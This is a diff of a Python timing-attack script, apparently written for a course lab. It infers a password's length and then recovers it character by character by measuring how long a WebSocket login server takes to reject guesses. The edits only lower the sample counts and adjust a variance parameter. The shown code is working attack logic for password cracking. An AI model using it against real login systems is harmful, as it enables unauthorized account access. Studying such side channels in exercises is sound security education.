@@ -8,7 +8,7 @@ from time import sleep
 
 # --- SERVER CONNECTION LOGIC ---
 
-async def client_connect(username, password, variance=0.001):
+async def client_connect(username, password, variance=0.003):
     """
     Asynchronously connects to the remote server via WebSockets.
     Sends the login credentials and returns the server's response.
@@ -42,7 +42,7 @@ def call_server(username, password):
 # The list of all possible characters we will test (a-z and 0-9)
 CHARSET = string.ascii_lowercase + string.digits 
 
-def get_stable_time(student_number, password, samples=80):
+def get_stable_time(student_number, password, samples=20):
     """
     Measures how many seconds the server takes to process a login attempt.
     To ignore 'lag' or network spikes, it tries (samples) times and takes the 
@@ -70,7 +70,7 @@ def find_password_length(student_number):
     for length in range(1, 21):
         # Create a dummy password of the current length (e.g., 'aaaaa')
         test_pw = "a" * length
-        t = get_stable_time(student_number, test_pw, samples=80)
+        t = get_stable_time(student_number, test_pw, samples=20)
         results.append((t, length))
         print(f"  Length {length:02}: {t:.5f}s")
     
@@ -99,7 +99,7 @@ def crack_password(student_number):
         for char in CHARSET:
             current_pw[i] = char
             test_str = "".join(current_pw)
-            t = get_stable_time(student_number, test_str, samples=80)
+            t = get_stable_time(student_number, test_str, samples=20)
             char_results.append((t, char))
         
         # In a timing attack, the server compares the password character 
